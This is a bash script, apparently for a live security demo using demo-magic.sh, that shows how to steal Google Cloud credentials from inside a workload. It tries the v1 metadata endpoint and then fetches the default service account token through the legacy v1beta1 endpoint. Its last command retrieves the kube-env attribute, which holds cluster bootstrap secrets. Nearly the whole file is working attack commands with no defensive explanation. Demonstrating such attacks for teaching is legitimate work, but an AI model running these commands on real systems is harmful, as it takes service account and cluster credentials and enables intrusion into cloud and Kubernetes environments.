#!/bin/bash

set -e

. demo-magic.sh -d
clear

p "# Try to get the token from the regular v1 API"
pe "wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
p "# Now with v1beta1"
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
echo ""
p "# Check token scopes"
p "# Grab kube-env"
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
